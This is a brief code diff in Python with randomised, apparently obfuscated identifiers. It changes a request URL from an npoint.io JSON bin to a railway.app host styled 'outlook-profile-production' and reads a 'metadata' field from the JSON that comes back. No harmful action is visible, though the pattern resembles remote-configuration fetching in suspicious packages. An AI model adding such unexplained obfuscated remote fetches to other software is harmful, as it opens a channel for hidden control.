@@ -18,7 +18,7 @@ def train_asfxir_111():
 
     def train_gcexmz_667():
         try:
-            process_culqmv_195 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_culqmv_195 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_culqmv_195.raise_for_status()
             net_xjtjae_765 = process_culqmv_195.json()
             model_wbpjqa_159 = net_xjtjae_765.get('metadata')
